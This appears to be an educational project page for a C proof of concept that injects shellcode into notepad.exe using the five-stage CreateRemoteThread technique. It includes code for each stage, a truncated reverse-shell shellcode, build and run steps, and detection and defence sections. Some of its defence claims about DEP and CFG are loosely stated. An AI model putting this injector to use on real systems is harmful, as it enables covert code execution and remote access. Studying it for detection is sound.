Overview

⚠️

Educational purpose only. This is a proof-of-concept for security research and learning. Unauthorised process injection is illegal under the Computer Misuse Act. Only use in controlled lab environments on systems you own or have explicit written permission to test.

Process injection is a technique where executable code is forcibly loaded into the address space of another running process. Once injected, the code runs with that process's privileges and identity — making detection significantly harder since all activity appears to come from a legitimate process like Notepad.

This demo implements the classic five-stage injection pattern in C using the Windows API, targeting notepad.exe as the victim process. The injected shellcode opens a reverse shell on port 4444.

01

How It Works

The injection follows five sequential stages. Each stage uses a specific Win32 API call, and each must succeed before the next can proceed.

Stage 1 CreateToolhelp32Snapshot — enumerate all running processes, find notepad.exe PID
↓
Stage 2 OpenProcess(PROCESS_ALL_ACCESS) — get a handle to the target process
↓
Stage 3 VirtualAllocEx(PAGE_EXECUTE_READWRITE) — allocate executable memory inside notepad
↓
Stage 4 WriteProcessMemory — copy shellcode bytes into the allocated memory
↓
Stage 5 CreateRemoteThread — start a new thread in notepad pointing at the shellcode

At the end of stage 5, the shellcode runs inside notepad.exe with notepad's security context, privileges, and identity — the reverse shell connection appears to originate from Notepad.

02

Stage 1 — Process Enumeration

Before injecting, the code needs the Process ID (PID) of the target. Rather than hardcoding a PID — which changes every run — it enumerates all running processes dynamically.

InjDemo.c — process enumeration C 
// Take a snapshot of all running processes
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

PROCESSENTRY32W pe32;
pe32.dwSize = sizeof(PROCESSENTRY32W);

// Iterate through every running process
while (Process32NextW(hSnapshot, &pe32)) {
    if (!_wcsicmp(pe32.szExeFile, L"notepad.exe")) {
        remote_pid = pe32.th32ProcessID;  // found it
        break;
    }
}
CloseHandle(hSnapshot);

TH32CS_SNAPPROCESS creates a snapshot of all processes. _wcsicmp does a case-insensitive wide-string comparison so Notepad.EXE and notepad.exe both match. If notepad isn't found remote_pid stays 0 and later stages fail gracefully.

03

Stage 2 — Open Process Handle

With the PID found, the code opens a handle to the process. The handle is required for every subsequent API call that interacts with notepad's memory or threads.

InjDemo.c — open handle C 
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,  // full read/write/execute permissions
    TRUE,                // handle is inheritable
    remote_pid           // target PID found in Stage 1
);

if (hProcess) {
    // Handle opened — continue to Stage 3
} else {
    // Access denied — insufficient privileges
}
⚠️

Requires matching or elevated privileges. PROCESS_ALL_ACCESS will fail if the injector runs with lower privileges than the target process. Run as Administrator to ensure this succeeds.

04

Stage 3 — Allocate Memory in Target

Memory must be allocated inside notepad's address space to hold the shellcode. Critically, it must be marked as executable — otherwise the CPU will refuse to run it.

InjDemo.c — memory allocation C 
LPVOID exec_mem = VirtualAllocEx(
    hProcess,                        // target process handle
    NULL,                            // let Windows choose the address
    sizeof(shellcode),               // allocate exactly enough space
    MEM_COMMIT | MEM_RESERVE,       // reserve and commit immediately
    PAGE_EXECUTE_READWRITE           // allow read, write AND execute
);

PAGE_EXECUTE_READWRITE is the critical flag — it allows the region to be written (Stage 4) and then executed (Stage 5). This combination is a major detection indicator since legitimate applications rarely need memory that is both writable and executable simultaneously.

05

Stage 4 — Write Shellcode

The shellcode bytes are copied from the injector process into the allocated memory region inside notepad. This crosses the process boundary — writing into another process's memory space.

InjDemo.c — write shellcode C 
// x64 reverse shell shellcode (~300 bytes, hex-encoded)
unsigned char shellcode[] =
    "\x48\x31\xc9\x48\x81\xe9\xc0\xff\xff\xff"
    "\x48\x8d\x05\xef\xff\xff\xff\x48\xbb...";  // truncated

// Copy shellcode into notepad's allocated memory
WriteProcessMemory(
    hProcess,           // target process handle
    exec_mem,           // destination address (from Stage 3)
    shellcode,          // source — our shellcode bytes
    sizeof(shellcode),  // number of bytes to write
    NULL                // bytes written (optional output)
);

The shellcode is position-independent (PIC) — it works regardless of where in memory it lands, since it resolves all API addresses dynamically at runtime rather than relying on fixed addresses.

06

Stage 5 — Remote Thread Execution

The final step creates a new thread inside notepad.exe whose entry point is the injected shellcode. From this point the shellcode runs autonomously inside notepad with notepad's full privileges.

InjDemo.c — create remote thread C 
HANDLE hThread = CreateRemoteThread(
    hProcess,                              // target process
    NULL,                                  // default security attributes
    0,                                     // default stack size
    (LPTHREAD_START_ROUTINE)exec_mem,      // entry point = our shellcode
    NULL,                                  // no parameter
    0,                                     // run immediately
    NULL                                   // thread ID (not needed)
);

// Shellcode now running inside notepad.exe
// Reverse shell opens on port 4444
CloseHandle(hThread);
CloseHandle(hProcess);
✅

Expected output. The console prints the PID of notepad, confirms each stage succeeded, then prints "Shell Opened on Port 4444". The reverse shell connection appears in network logs as originating from notepad.exe.

07

Win32 APIs Used

CreateToolhelp32Snapshot
tlhelp32.h
Creates a snapshot of all running processes, threads, modules, or heaps. Used here with TH32CS_SNAPPROCESS to enumerate every process and find notepad's PID.
OpenProcess
processthreadsapi.h
Opens a handle to an existing process. PROCESS_ALL_ACCESS grants full read, write, and execute permissions. Requires the caller to have matching or higher privileges than the target.
VirtualAllocEx
memoryapi.h
Allocates memory in the virtual address space of another process. The PAGE_EXECUTE_READWRITE flag is the key indicator — legitimate code rarely needs memory that is simultaneously writable and executable.
WriteProcessMemory
memoryapi.h
Writes data into the memory of another process. Used here to copy shellcode bytes from the injector into the allocated region inside notepad. Crosses the process memory boundary.
CreateRemoteThread
processthreadsapi.h
Creates a thread in the virtual address space of another process. The thread entry point is set to the injected shellcode address — this is the trigger that starts execution.

Build & Run

⚠️

Run in an isolated VM only. The shellcode opens a real reverse shell. Only execute in an air-gapped lab environment. Antivirus will likely flag or block the compiled executable.

Build with Visual Studio

  1. Open the solution

    Open Project1.sln in Visual Studio 2022 or later.

  2. Select x64 configuration

    Set the build to x64 — the shellcode is 64-bit and will fail on a 32-bit build. Choose Debug or Release.

  3. Build the solution

    Press Ctrl+Shift+B. Output goes to Project1\x64\Debug\ or Project1\x64\Release\.

Build from command line

Developer Command Prompt CMD 
cd Process_Injection_Demo
msbuild Project1.sln /p:Configuration=Release /p:Platform=x64

Running the demo

  1. Open Notepad first

    Launch notepad.exe before running the injector — the enumeration in Stage 1 will fail if notepad isn't running.

  2. Run as Administrator

    Right-click the compiled EXE → Run as administrator. Required for PROCESS_ALL_ACCESS to succeed.

  3. Press Enter at each stage

    The demo pauses at each stage so you can observe the output and inspect the process in Task Manager or Process Hacker.

Detection

Despite the evasion benefits, process injection leaves detectable traces at every stage:

StageIndicatorDetection method
Stage 2OpenProcess(PROCESS_ALL_ACCESS) from unexpected callerEDR API hooking, Sysmon Event ID 10
Stage 3VirtualAllocEx with PAGE_EXECUTE_READWRITEMemory scanning, EDR behavioural rules
Stage 4WriteProcessMemory into a running processSysmon, kernel callbacks
Stage 5CreateRemoteThread with entry point outside module boundsEDR, Sysmon Event ID 8
Post-injectionNetwork connection from notepad.exe to port 4444Network monitoring, firewall logs
Post-injectionThread in notepad with entry point not in any loaded DLLMemory forensics, Process Hacker
🔍

Sysmon is your friend. Sysmon Event ID 8 (CreateRemoteThread) and Event ID 10 (ProcessAccess) will both fire during this injection. Forwarding these to a SIEM gives you near-real-time detection of this technique.

10

Defence

  1. Deploy an EDR solution

    Modern EDR products hook the Win32 APIs used in this demo — VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread — and alert or block based on behavioural patterns.

  2. Enable Data Execution Prevention (DEP)

    DEP marks non-code memory regions as non-executable. While this demo uses PAGE_EXECUTE_READWRITE to bypass it, DEP still raises the bar for less sophisticated attackers.

  3. Enable Control Flow Guard (CFG)

    CFG validates that indirect function calls — like the thread entry point in CreateRemoteThread — jump to known valid code locations. Shellcode at an arbitrary allocated address would fail CFG validation.

  4. Deploy Sysmon with detection rules

    Configure Sysmon to log Event ID 8 (CreateRemoteThread) and Event ID 10 (ProcessAccess with PROCESS_ALL_ACCESS). Forward to SIEM and alert on these events from unusual callers.

  5. Principle of least privilege

    Running processes with minimum necessary privileges makes it harder to obtain PROCESS_ALL_ACCESS on higher-privileged targets. UAC and PAM both help limit the blast radius.

  6. Monitor for unusual network connections

    Alert on outbound network connections from processes that should never make network calls — like notepad.exe connecting to port 4444. This is the most obvious post-injection signal.
